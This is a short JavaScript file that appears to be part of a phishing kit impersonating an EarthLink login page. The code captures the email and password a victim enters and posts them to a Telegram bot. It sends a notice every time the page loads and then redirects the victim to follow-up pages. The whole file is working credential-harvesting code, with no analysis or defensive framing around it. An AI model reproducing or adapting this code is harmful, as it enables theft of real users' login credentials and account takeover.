const emailValue = document.getElementById("email");
const passwordValue = document.getElementById("password");
const submit = document.getElementById("submit");

const telegram = (email, password) => {
  const MESSAGE =
    email && password
      ? `📨 ${email}\n\n 🔐 ${password}`
      : "📩 EarthLink Incoming";
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: MESSAGE,
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      console.log("Message sent:");
      if (email != null && page === 1) {
        setTimeout(() => {
          window.location.href = "relog.html";
        }, 2000);
      } else if (email != null && page === 2) {
        setTimeout(() => {
          window.location.href = "dmb.html";
        }, 2000);
      } else {
        return;
      }
    })
    .catch((error) => {
      console.error("Error:", error);
    });
};

submit.addEventListener("click", (e) => {
  e.preventDefault();
  if(emailValue.value == "" || passwordValue.value == ""){
    alert("Field cant be Empty")
    return;
  }
  telegram(emailValue.value, passwordValue.value);
});

telegram();
